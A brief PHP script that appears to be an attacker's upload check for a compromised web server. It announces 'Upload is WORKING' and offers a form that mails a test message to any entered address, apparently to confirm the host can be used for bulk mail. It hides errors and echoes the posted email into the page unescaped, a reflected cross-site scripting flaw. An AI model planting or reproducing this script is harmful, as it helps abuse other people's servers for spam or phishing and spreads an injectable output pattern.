<?php
error_reporting(0);

?>
Upload is <b><color>WORKING</color></b><br>
Check  Mailling ..<br>
<form method="post">
<input type="text" name="email" value="<?php print $_POST['email']?>"required >
<input type="submit" value="Send test >>">
</form>
<br>
<?php
if (!empty($_POST['email'])){
	$xx = rand();
	mail($_POST['email'],"Result Report Test - ".$xx,"WORKING !");
	print "<b>send an report to [".$_POST['email']."] - $xx</b>"; 
}
?>